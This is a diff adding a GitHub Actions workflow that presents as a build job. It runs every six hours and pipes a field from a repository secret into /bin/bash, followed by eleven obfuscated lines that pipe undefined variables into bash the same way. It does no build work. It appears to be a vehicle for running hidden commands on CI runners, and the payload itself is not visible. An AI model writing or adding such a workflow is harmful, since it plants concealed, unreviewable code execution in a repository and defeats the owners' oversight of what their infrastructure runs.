@@ -1,0 +1,28 @@
+name: zoumayuetan
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '49 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: zoumayuetan
+        env:
+          l8372: ${{ secrets.l8372 }}
+        run: |
+          echo $l8372 | jq -r .kbplc41 | /bin/bash
+          echo $gpru6191 | jq -r .zn06367 | /bin/bash
+          echo $myc08933 | jq -r .lxqq5 | /bin/bash
+          echo $t41 | jq -r .kx49 | /bin/bash
+          echo $eib950 | jq -r .e485 | /bin/bash
+          echo $aueto5 | jq -r .wohgx22304 | /bin/bash
+          echo $usvh623 | jq -r .tju8 | /bin/bash
+          echo $tdtld26356 | jq -r .g16621 | /bin/bash
+          echo $xgj06 | jq -r .dde1670 | /bin/bash
+          echo $gctz64313 | jq -r .kkcqh18475 | /bin/bash
+          echo $ttpk1 | jq -r .xx974 | /bin/bash
+          echo $xf15075 | jq -r .fmr461 | /bin/bash
+
